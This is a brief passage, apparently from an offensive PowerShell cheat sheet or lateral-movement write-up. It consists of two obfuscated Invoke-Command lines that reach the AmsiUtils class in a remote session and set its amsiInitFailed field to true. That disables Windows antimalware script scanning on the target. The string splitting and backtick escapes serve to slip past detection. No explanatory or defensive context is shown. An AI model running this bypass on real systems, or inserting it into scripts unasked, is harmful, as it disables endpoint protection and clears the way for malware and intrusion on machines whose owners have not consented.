...
```
Invoke-Command -Scriptblock {$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');} $sess
Invoke-Command -Scriptblock {$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);} $sess
```
